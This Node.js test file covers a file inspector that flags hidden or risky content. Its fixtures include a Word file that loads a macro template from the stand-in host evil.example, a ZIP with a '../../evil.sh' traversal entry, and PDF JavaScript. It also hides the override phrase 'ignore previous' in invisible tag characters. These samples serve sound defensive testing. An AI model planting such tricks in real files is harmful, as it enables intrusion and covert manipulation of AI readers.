import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { zipSync, strToU8 } from 'fflate';
import { inspect, detectFormat, buildSample, measureAt, pdfDate, hashes } from '../src/fileforge/inspector.js';

const bytes = (...parts) => { const list = parts.map(p => (typeof p === 'string' ? Buffer.from(p, 'latin1') : Buffer.from(p))); return new Uint8Array(Buffer.concat(list)); };
const titles = result => result.findings.map(f => f.title);
const value = (result, label) => [...result.facts, ...result.metadata.flatMap(g => g.items)].find(([k]) => k === label)?.[1];
const pngChunk = (type, data) => { const head = Buffer.alloc(8); head.writeUInt32BE(data.length); head.write(type, 4, 'latin1'); return Buffer.concat([head, Buffer.from(data), Buffer.alloc(4)]); };
const png = (...chunks) => bytes([137, 80, 78, 71, 13, 10, 26, 10], pngChunk('IHDR', Buffer.from([0, 0, 0, 4, 0, 0, 0, 3, 8, 6, 0, 0, 0])), ...chunks, pngChunk('IDAT', Buffer.from('pixels')), pngChunk('IEND', Buffer.alloc(0)));
const jpeg = bytes([0xff, 0xd8, 0xff, 0xe0, 0, 16], 'JFIF\0', [1, 1, 0, 0, 1, 0, 1, 0, 0], [0xff, 0xc0, 0, 11, 8, 0, 2, 0, 3, 1, 1, 0x11, 0], [0xff, 0xda, 0, 8, 1, 1, 0, 0, 0x3f, 0], [1, 2, 3, 0xff, 0, 4], [0xff, 0xd9]);

test('formats are recognised from their bytes, not the name', () => {
  for (const [data, id] of [[png(), 'png'], [jpeg, 'jpeg'], [bytes('%PDF-1.7\n'), 'pdf'], [bytes('GIF89a', Buffer.alloc(8)), 'gif'], [bytes('MZ', Buffer.alloc(80)), 'exe'], [bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1], Buffer.alloc(60)), 'elf'], [bytes('SQLite format 3\0', Buffer.alloc(100)), 'sqlite'], [bytes([0x1f, 0x8b, 8, 0], Buffer.alloc(20)), 'gzip'], [bytes('RIFF', [4, 0, 0, 0], 'WAVE'), 'wav'], [bytes([0, 0, 0, 24], 'ftypheic', [0, 0, 0, 0], 'mif1heic'), 'heic'], [bytes([0, 0, 0, 20], 'ftypqt  ', [0, 0, 0, 0], 'qt  '), 'mov'], [bytes('{"a": [1, 2]}'), 'json'], [bytes('<svg xmlns="http://www.w3.org/2000/svg"/>'), 'svg'], [bytes('#!/bin/sh\necho hi'), 'script'], [bytes('hello world\n'), 'text']]) assert.equal(detectFormat(data).id, id, id);
  const disguised = inspect(png(), 'invoice.pdf');
  assert.equal(disguised.format.id, 'png'); assert.equal(disguised.mismatch, true);
  assert.match(titles(disguised)[0], /extension does not match/);
  const program = inspect(bytes('MZ', Buffer.alloc(0x3a), [0x40, 0, 0, 0], 'PE\0\0', [0x64, 0x86, 1, 0], Buffer.alloc(300)), 'report.pdf.exe');
  assert.ok(titles(program).includes('Double file extension'));
  const hidden = inspect(bytes('MZ', Buffer.alloc(0x3a), [0x40, 0, 0, 0], 'PE\0\0', [0x64, 0x86, 1, 0], Buffer.alloc(300)), 'photo.jpg');
  assert.match(titles(hidden)[0], /program disguised/);
  assert.equal(inspect(png(), 'image.PNG').mismatch, false);
});

test('JPEG sample: camera EXIF, GPS, comment, user path and an appended ZIP are all found', () => {
  const zip = zipSync({ 'notes/secret.txt': strToU8('hidden after the end of the photo') });
  const sample = buildSample(jpeg, zip);
  const r = inspect(sample, 'holiday-photo.png');
  assert.equal(r.format.id, 'jpeg'); assert.equal(r.mismatch, true);
  assert.equal(value(r, 'Camera make'), 'Alisoglu Optics'); assert.equal(value(r, 'Camera owner'), 'Sample Owner');
  assert.deepEqual([r.gps.lat, r.gps.lon], [52.5201, 13.4056]);
  assert.equal(value(r, 'Dimensions'), '3 × 2 px');
  const all = titles(r);
  for (const title of ['GPS location is stored in this file', 'Hidden data after the end of the file', 'Text comment inside the image', 'Folder paths with user names', 'Personal or device details in the metadata', 'Other files are embedded inside']) assert.ok(all.includes(title), title);
  assert.equal(r.findings[0].level, 'warn');
  const trailing = r.findings.find(f => f.title === 'Hidden data after the end of the file');
  assert.equal(trailing.save.length, zip.length); assert.equal(trailing.offset, sample.length - zip.length);
  assert.match(trailing.detail, /ZIP archive/);
  const hit = r.embedded.find(e => e.kind === 'zip');
  assert.equal(hit.offset, sample.length - zip.length); assert.equal(hit.length, zip.length);
  assert.ok(r.strings.interesting.some(s => s.kind === 'path' && s.value.includes('sample-user')));
});

test('PNG text chunks, AI prompts and Content Credentials are reported', () => {
  const r = inspect(png(pngChunk('tEXt', Buffer.from('parameters\0a lighthouse at dusk\nSteps: 30, Sampler: Euler a, Seed: 1234')), pngChunk('caBX', Buffer.from('jumbf'))), 'art.png');
  assert.equal(value(r, 'Dimensions'), '4 × 3 px');
  assert.ok(titles(r).includes('AI generation settings are embedded'));
  assert.ok(titles(r).includes('Content Credentials (C2PA) present'));
  assert.match(value(r, 'parameters'), /lighthouse/);
  const plain = inspect(png(pngChunk('tEXt', Buffer.from('Software\0Paint'))), 'a.png');
  assert.ok(titles(plain).includes('Text is stored inside the PNG'));
  const after = inspect(bytes(png(), 'SECRET PAYLOAD '.repeat(400)), 'a.png');
  assert.ok(titles(after).includes('Hidden data after the end of the file'));
});

test('PDF information, risky actions and incremental updates are read', () => {
  const pdf = bytes('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n4 0 obj\n<< /S /JavaScript /JS (app.alert\\(1\\)) >>\nendobj\n5 0 obj\n<< /Title (Quarterly \\(draft\\)) /Author <FEFF00C700E0006E> /Producer (Test Writer) /CreationDate (D:20240102130405+01\'00\') >>\nendobj\ntrailer\n<< /Root 1 0 R /Info 5 0 R >>\n%%EOF\n', 'trailer\n<< /Root 1 0 R /Info 5 0 R /Prev 9 >>\n%%EOF\n');
  const r = inspect(pdf, 'report.pdf');
  assert.equal(value(r, 'Title'), 'Quarterly (draft)'); assert.equal(value(r, 'Author'), 'Çàn');
  assert.equal(value(r, 'Created'), '2024-01-02 13:04:05 +01:00'); assert.equal(value(r, 'Pages'), '1');
  assert.ok(titles(r).includes('The PDF contains JavaScript'));
  assert.ok(titles(r).some(t => /Edited 1 time/.test(t)));
  assert.equal(pdfDate('D:2023'), '2023-01-01');
});

test('PDF metadata inside compressed object streams is found', async () => {
  const { zlibSync } = await import('fflate');
  const inner = '7 0 << /Author (Hidden Author) /Producer (ObjStm Writer) >>';
  const header = '7 0 ', data = zlibSync(strToU8(header + inner.slice(4)));
  const pdf = bytes('%PDF-1.5\n9 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ', String(data.length), ' >>\nstream\n', data, '\nendstream\nendobj\n10 0 obj\n<< /Type /XRef /Root 1 0 R /Info 7 0 R >>\nstream\nendstream\nendobj\n%%EOF\n');
  const r = inspect(pdf, 'x.pdf');
  assert.equal(value(r, 'Author'), 'Hidden Author');
});

test('Office documents: properties, macros, tracked changes, hidden sheets and external templates', () => {
  const core = '<cp:coreProperties xmlns:cp="c" xmlns:dc="d"><dc:creator>Jane Roe</dc:creator><cp:lastModifiedBy>J. Doe</cp:lastModifiedBy><dcterms:created>2025-01-01T10:00:00Z</dcterms:created></cp:coreProperties>';
  const docx = zipSync({ '[Content_Types].xml': strToU8('<Types/>'), 'docProps/core.xml': strToU8(core), 'docProps/app.xml': strToU8('<Properties><Application>Microsoft Office Word</Application><Company>ACME &amp; Co</Company></Properties>'), 'word/document.xml': strToU8('<w:document><w:ins w:author="Editor A"/><w:del w:author="Editor B"/><w:r><w:rPr><w:vanish/></w:rPr></w:r></w:document>'), 'word/vbaProject.bin': strToU8('vba'), 'word/_rels/settings.xml.rels': strToU8('<Relationships><Relationship Id="r1" Type="http://schemas/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>') });
  const r = inspect(docx, 'contract.docx');
  assert.equal(r.format.id, 'docx'); assert.equal(r.mismatch, false);
  assert.equal(value(r, 'Author'), 'Jane Roe'); assert.equal(value(r, 'Company'), 'ACME & Co');
  for (const title of ['Contains macros (VBA code)', 'Tracked changes are still in the file', 'Hidden text', 'Loads content from outside the file', 'Names are saved in the document properties']) assert.ok(titles(r).includes(title), title);
  assert.match(r.findings.find(f => f.title.startsWith('Tracked')).detail, /Editor A, Editor B/);
  const xlsx = zipSync({ '[Content_Types].xml': strToU8('<Types/>'), 'xl/workbook.xml': strToU8('<workbook><sheets><sheet name="Visible" sheetId="1"/><sheet name="Salaries" sheetId="2" state="veryHidden"/></sheets></workbook>') });
  assert.match(inspect(xlsx, 'book.xlsx').findings.find(f => f.title === 'Hidden worksheets').detail, /Salaries/);
  assert.equal(inspect(zipSync({ 'a.txt': strToU8('x') }), 'fake.docx').mismatch, true);
});

test('archives: listing, unsafe paths, programs and data before the archive', () => {
  const zip = zipSync({ 'readme.txt': strToU8('hi'), '../../evil.sh': strToU8('rm'), 'invoice.pdf.exe': strToU8('MZ') });
  const r = inspect(zip, 'files.zip');
  assert.equal(r.entries.length, 3); assert.equal(r.entries.find(e => e.name === '../../evil.sh').flag, 'path');
  for (const title of ['Entries try to leave the extraction folder', 'The archive contains programs or scripts', 'Disguised file names inside']) assert.ok(titles(r).includes(title), title);
  const polyglot = inspect(bytes(png(), zipSync({ 'x.txt': strToU8('payload') })), 'image.png');
  assert.equal(polyglot.format.id, 'png'); assert.ok(titles(polyglot).includes('Hidden data after the end of the file'));
  assert.equal(measureAt(bytes(png(), 'x'), 0, 'png'), png().length);
});

test('text: invisible tag characters, bidi overrides and credentials are surfaced', () => {
  const hidden = [...'ignore previous'].map(c => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join('');
  const r = inspect(new TextEncoder().encode(`Hello${hidden} world\nconst admin = "user‮ ⁦// check later⁩ ⁦";\nkey = ghp_${'a'.repeat(36)}\n`), 'note.txt');
  assert.match(r.findings.find(f => /tag characters/.test(f.title)).detail, /ignore previous/);
  assert.ok(titles(r).includes('Text direction override characters'));
  assert.equal(r.findings[0].title, 'Looks like a password, key or access token');
  assert.equal(value(r, 'Encoding'), 'UTF-8');
  const name = inspect(png(), 'photo‮gpj.exe');
  assert.ok(titles(name).includes('The file name hides its real extension'));
});

test('real fixtures parse without errors and checksums match Node', async () => {
  const docx = await readFile('tests/fixtures/documents/sample.docx');
  const r = inspect(docx, 'sample.docx');
  assert.equal(r.format.id, 'docx'); assert.equal(value(r, 'Author'), 'python-docx');
  const pdf = await readFile('tests/fixtures/locked.pdf');
  const locked = inspect(pdf, 'locked.pdf');
  assert.ok(titles(locked).includes('The PDF is encrypted'));
  const { createHash } = await import('node:crypto');
  assert.equal((await hashes(new Uint8Array(pdf))).sha256, createHash('sha256').update(pdf).digest('hex'));
  const empty = inspect(new Uint8Array(0), 'empty.bin');
  assert.equal(empty.format.name, 'Empty file');
  const random = new Uint8Array(70000); let s = 7; for (let i = 0; i < random.length; i++) { s = (Math.imul(s, 1103515245) + 12345) >>> 0; random[i] = s >>> 24; }
  const unknown = inspect(random, 'blob.dat');
  assert.ok(unknown.entropy.overall > 7.9); assert.ok(titles(unknown).includes('Possibly encrypted or compressed data'));
});
